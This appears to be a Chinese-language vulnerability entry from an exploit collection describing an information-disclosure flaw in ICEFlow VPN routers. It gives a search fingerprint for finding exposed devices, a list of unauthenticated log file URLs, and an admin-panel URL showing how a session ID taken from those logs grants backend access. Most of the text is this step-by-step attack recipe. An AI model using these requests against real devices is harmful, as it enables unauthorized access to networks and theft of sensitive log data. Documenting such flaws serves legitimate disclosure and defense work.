# ICEFlow VPN log 信息泄露漏洞

## 漏洞描述

ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统

## 漏洞影响

<a-checkbox checked>ICEFlow VPN</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="ICEFLOW VPN Router"</a-checkbox></br>

## 漏洞复现

可访问的日志 Url

```plain
系统日志    http://url/log/system.log
VPN日志    http://url/log/vpn.log
访问日志	http://url/log/access.log
告警日志	http://url/log/warn.log
错误日志	http://url/log/error.log
调试日志	http://url/log1/debug.log
移动用户日志 http://url/log/mobile.log
防火墙日志	http://url/log/firewall.log
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313133204051.png)



根据日志信息获得session后，可利用实时登录系统管理后台：

```plain
http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0
```

